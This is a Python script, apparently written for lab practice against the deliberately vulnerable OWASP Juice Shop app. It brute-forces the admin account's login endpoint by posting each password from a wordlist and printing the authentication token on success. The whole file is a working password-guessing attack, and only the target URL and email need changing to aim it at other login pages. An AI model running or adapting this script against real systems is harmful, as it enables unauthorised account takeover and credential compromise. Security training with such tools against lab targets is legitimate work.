import os
import time
import requests

URL = os.environ.get("JS_TARGET", "http://192.168.100.51:3000").rstrip("/") + "/rest/user/login"
EMAIL = os.environ.get("JS_EMAIL", "admin@juice-sh.op")
WORDLIST = os.environ.get("JS_WORDLIST", "wordlist.txt")

with open(WORDLIST, encoding="latin-1") as f:
    for line in f:
        pw = line.strip()
        if not pw:
            continue

        try:
            t0 = time.time()
            r = requests.post(
                URL,
                json={"email": EMAIL, "password": pw},
                timeout=5
            )
            elapsed = time.time() - t0

            print(f"[*] Tried: {pw} | Status: {r.status_code} | Time: {elapsed:.2f}s")

            if r.status_code == 200:
                try:
                    data = r.json()
                    token = data.get("authentication", {}).get("token")
                    print(f"[+] FOUND: {pw}")
                    print("Token:", token[:40] if token else "No token")
                    break
                except requests.exceptions.JSONDecodeError:
                    print("[!] Successful response was not JSON")
            else:
                print(f"[-] Login failed: {r.status_code}")

        except requests.RequestException as e:
            print(f"[!] Request failed: {e}")

        time.sleep(float(os.environ.get("JS_BRUTE_DELAY", "1")))
